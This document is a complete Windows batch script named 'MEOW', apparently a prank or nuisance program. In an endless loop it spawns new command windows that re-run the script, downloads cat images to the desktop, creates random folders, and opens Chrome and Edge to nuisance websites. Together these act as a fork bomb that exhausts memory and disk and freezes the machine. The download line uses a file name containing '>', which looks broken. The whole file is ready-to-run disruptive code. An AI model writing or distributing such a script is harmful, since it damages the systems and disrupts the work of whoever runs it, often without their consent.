@echo off
:top
start
title MEOW
powershell -c "Invoke-WebRequest -Uri 'https://cataas.com/cat' -OutFile '%USERPROFILE%\Desktop\Cat->%random%.png'"
md "%USERPROFILE%\Desktop\MEOW-%random%"
md "%USERPROFILE%\%random%"
start chrome https://piv.pivpiv.dk/
start microsoft-edge https://piv.pivpiv.dk/
start chrome https://youareanidiot.cc/
start microsoft-edge https://youareanidiot.cc/
goto top
